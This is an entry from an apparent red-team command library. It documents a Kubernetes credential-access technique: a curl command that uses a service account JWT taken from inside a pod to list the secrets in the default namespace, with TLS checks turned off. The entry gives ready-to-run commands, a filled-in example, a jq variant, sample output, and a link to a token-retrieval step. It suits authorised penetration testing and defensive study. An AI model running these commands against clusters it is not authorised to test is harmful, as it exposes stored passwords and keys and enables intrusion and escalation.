---
id: 25e6a25f-de8a-423f-a7c8-b0754fffc5db
name: curl-retrieve-default-namespace-secrets
type: command
executor: bash
data: >-
  curl -k -v -H "Authorization: Bearer $_JWT_TOKEN"
  https://$_MASTER_IP:$_PORT/api/v1/namespaces/default/secrets/
output: null
created_at: '2023-04-06T03:56:01.357661+00:00'
updated_at: '2023-04-10T20:33:59.621982+00:00'
platforms:
  - Kubernetes
tags:
  - credential-access
  - kubernetes
  - api-query
verified: true
validated: true
---

# curl-retrieve-default-namespace-secrets

## Command

```bash
curl -k -v -H "Authorization: Bearer $_JWT_TOKEN" https://$_MASTER_IP:$_PORT/api/v1/namespaces/default/secrets/
```

## Description

This command uses curl to query the Kubernetes API for a list of secrets in the default namespace, authenticating with a service account JWT token. It tests token privileges and can reveal sensitive data like passwords or keys stored in secrets. Run from within a pod after token retrieval.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_JWT_TOKEN | The service account JWT token obtained from the pod's token file | Yes |
| $_MASTER_IP | IP address of the Kubernetes API server (e.g., cluster service IP like 10.96.0.1) | Yes |
| $_PORT | API server port (typically 443 for HTTPS) | Yes |
| -k | Insecure mode: skip SSL certificate verification (useful for self-signed certs) | No |
| -v | Verbose output for request/response details | No |
| -H "Authorization: Bearer $_JWT_TOKEN" | Header to pass the JWT token for authentication | Yes |

## Examples

### Basic Usage

```bash
curl -k -v -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIs..." https://10.96.0.1:443/api/v1/namespaces/default/secrets/
```

### Advanced Usage

Add output formatting with jq (if available):

```bash
curl -k -s -H "Authorization: Bearer $_JWT_TOKEN" https://$_MASTER_IP:$_PORT/api/v1/namespaces/default/secrets/ | jq '.items[].metadata.name'
```

## Expected Output

A JSON response listing secrets if successful (HTTP 200), e.g.:

```json
{
  "kind": "SecretList",
  "apiVersion": "v1",
  "metadata": {...},
  "items": [
    {
      "metadata": {
        "name": "default-secret",
        "namespace": "default"
      },
      "type": "kubernetes.io/service-account-token",
      "data": {...}
    }
  ]
}
```
Errors include 401 Unauthorized (invalid token) or 403 Forbidden (insufficient privileges).

## Related

- [[procedures/Kubernetes-Privileged-Service-Account-Token-Retrieval]]
